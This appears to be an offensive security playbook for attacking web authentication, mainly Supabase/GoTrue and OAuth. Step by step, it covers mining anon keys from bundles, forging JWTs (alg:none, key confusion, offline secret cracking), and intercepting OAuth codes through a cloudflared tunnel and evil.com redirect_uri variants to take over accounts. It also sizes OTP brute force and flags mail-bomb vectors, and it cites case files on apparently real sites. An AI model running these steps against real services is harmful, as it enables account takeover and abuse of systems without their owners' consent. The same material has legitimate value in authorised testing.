# Class 4 — Auth/Identity — Arsenal Battery

Fingerprint the IdP BEFORE driving the form. Capture the FULL authorize URL (realm/
return_to/ticket params, loginN series) first — see `edge-gate-recon.md`.

## 4.1 GoTrue/Supabase chain (score 90 — THE standard ladder)
- FINGERPRINT: `www-authenticate: Basic realm="service"` + `x-kong-response-latency` +
  `x-kong-request-id` + ACAH contains `apikey` = Kong-fronted Supabase.
- 1. Mine anon key from bundles: `VITE_SUPABASE_ANON_KEY:` (itself an HS256 JWT `role:anon`).
- 2. `GET /auth/v1/settings` + `/auth/v1/health` WITH `apikey: <anon>` = providers, autoconfirm
  (email/phone), disable_signup, sms_provider, GoTrue version. Everything 401 without it.
- 3. Signup with planted privilege keys (§3.4 mass-assignment gate — persistence ≠ trust).
- 4. Email-confirm end-to-end (self-bootstrapped, no operator creds): public-inbox API
  (mailinator `/api/v2/domains/public/inboxes/<u>` → `/messages/<id>`; harakirimail
  `/api/v1/inbox/<n>` → `/api/v1/email/<_id>` → `bodyhtmltext`) → regex `token=([a-f0-9]{40,})`
  → consume ONCE via `GET /auth/v1/verify?token=...&type=signup&email=...` (303 → capture
  `#access_token=...&refresh_token=...` from `%{redirect_url}` fragment — one-time).
  JSON `POST /auth/v1/verify` may reject VALID tokens (`otp_expired`) — use the GET route.
- 5. Decode JWT: does `user_metadata.role` survive into claims? Then the §3.4 trust gate.
- 6. Confirm-email `redirect_to` param = mirror-host leak (Lovable.app mirrors etc.).
- Signup persists unconfirmed row (`role:authenticated`, blocked only by `email_not_confirmed`)
  = LOW unless a post-confirm API trusts `aud` without `email_verified`.

## 4.2 JWT forge checklist — OFFLINE FIRST (zero traffic before this)
- (a) OFFLINE crack of known sig with default/self-hosted secrets (SupaBomb list) — hashcat.
- (b) HS256 forge with anon-key-as-secret against `/auth/v1/user` AND `/rest/v1/` separately
  (`PGRST301` = separate trust root).
- (c) alg:none, `jwk` header injection, tamper-keep-sig, kid-injection, RS256→HS256 confusion.
- GoTrue checks claims BEFORE signature: `missing sub claim` = sig never ran — reorder probes.
- Uniform `invalid_api_key` for EVERY bearer/JWT/alg-none variant = no JWT path exists —
  log the negative, STOP (keys are opaque strings; forging is chasing nothing).

## 4.3 OAuth interception harness (score 90 — the live decisive test)
- The 200/302 on the authorize page proves NOTHING (Discord validates at token-exchange,
  Google at render — provider split is the impact gate).
- DECISIVE: local listener (`oauth_callback_interceptor.py` pattern / webhook.site fallback)
  + `cloudflared tunnel --url http://localhost:8888` → grep the trycloudflare URL →
  `curl -s -o /dev/null -w '%{redirect_url}' '/auth/v1/authorize?provider=discord&redirect_uri=<tunnel>/cb'`
  → 302 Location carries attacker URI = GoTrue-side flaw (~8.1). Operator clicks the crafted
  authorize URL in a logged-in browser; `?code=` landing on listener = CONFIRMED takeover chain.
- Variant matrix: `http://evil.com/cb` (no HTTPS enforcement), `/callback/../../evil` (no
  normalization), `evil.com@legithost/cb` (userinfo confusion). `redirect_to` is a DIFFERENT
  benign param — dead provider query param (good false-positive discriminator).
- State tests: 2× /start → state A,B; `callback?state=A&code=fake` + cookie B → `bad_oauth_state`
  = hardened. No-cookie/no-state → 400. `redirect_uri=evil` on /start returning the HARDCODED
  callback verbatim = ignored (fast negative).
- Provider app pages rendering generic code-entry for bogus client_ids = no enumeration oracle.

## 4.4 Session fixation / cookie hygiene (score 65)
- URL-param session ids (`?sid=`) → set, login, check retention. No rotation on privilege
  change. Read raw `Set-Cookie` on EVERY authed endpoint: HttpOnly/Secure/SameSite/Path scope.
- Cookie-scoped OAuth state yardstick: `HttpOnly; Secure; SameSite=Lax; Path=/v1/auth/discord;
  Max-Age=600` + server-issued HS256 JWT, forged → 400.

## 4.5 MFA/OTP entropy sizing (score 70 — record the math, not "unthrottled")
- Throughput calibration: 100-thread curl ≈ 52 req/s effective. 6-digit space (1M): single-
  thread 5.4 req/s = 51h; 100 threads = 5.3h. TTL vs that = the verdict.
- Charset oracle: off-format tokens (`abcdefgh`, `12345`, `Z9Z9Z9`) — uniform `otp_expired`
  regardless = no charset oracle, error channel blind. Size entropy by triggering ONE live
  flow (§3.8 consumers) — one real code settles it; uniform errors tell nothing.

## 4.6 Password reset (score 70)
- Host-header poisoning (§1.9); token in referrer on hosted-mail previews; single-use/TTL
  (replay the SAME token twice — second must fail); predictability (timestamp-shaped tokens).

## 4.7 SSO anchors (score 65, fingerprint-first)
- SAML: signature wrapping, assertion replay, audience restriction. OIDC: nonce/state
  validation, token-exchange abuse, consent-phishing surface. SCIM: over-scoped tokens,
  bulk enumeration. LDAP/Kerberos classes from vector-matrix N (owned infra).
- Capture the FULL external-IdP authorize URL before touching the form (realm/return_to/
  ticket, loginN infra series).

## 4.8 Auth-mode header split (score 75)
- Multi-tenant bundles carry auth-mode selectors (`X-Chat-Auth-Mode: account|platform_key`).
  Error chain enumerates itself: bare → 400 naming the header → each value names the next
  credential. Each branch = its OWN auth surface against its OWN backend.

## 4.9 Web3-wallet auth chain (score 75)
- Read the challenge SPEC from the bundle: flat `personal_sign` with NO timestamp/expiry/
  nonce-binding = replayable challenge (hypothesis ~65 until replay test on own wallet).
- Ephemeral keypair signup when the exchange is open = autonomous self-account (no identity
  fraud, shred the key from RAM after). State-cookie carrier (`state` cookie, never the
  `?state=` URL param — query_state mirror may be unread).

## 4.10 Auth-chain rate sweep (score 75)
- The WHOLE chain, not just login: `/auth/v1/verify`, handoff exchange, token code brute,
  forgot-password, resend-verification (no captcha + no limit = mail-bomb pump vector even
  with uniform no-enumeration responses). One working limiter (signup 60s) proves nothing
  about the others. 15-26 rapid garbage inputs per endpoint, `-w '%{http_code}'`, once.

## 4.11 Dead-invite gates (score 60)
- Invite-accept signatures: `?invite=<token>` acceptance is client- or server-checked?
  Expired-but-valid-shaped token behavior; enumeration oracle on 404-vs-410.

## DEEP DIVE — holyshit-mode depth (load on confirm)
- → holyshit `references/supabase-gotrue-playbook.md` — full GoTrue auth-chain recipe, verify-token 303 fragment, rate-sweep method
- → holyshit `references/web-auth-chain-playbook.md` — RLS trust-flag escalation, web3-wallet challenge replay/binding ladder
- → holyshit `references/oauth-redirect-uri-impact-gate.md` — redirect_uri override + live-listener interception (cloudflared + callback catcher)
- → holyshit `references/case-gratisfy-xyz.md` — the GoTrue HOLY SHIT: redirect_uri forwarding, unauth handoff exchange, RNG entropy oracle
- → holyshit `references/case-duelbits-com.md` — state-cookie carrier (signIn reads cookie named `state`), OAuth state-binding yardstick
- → holyshit `references/case-logfare-ai-retest2.md` — cookie SameSite downgrade discipline, origin-lock matrix
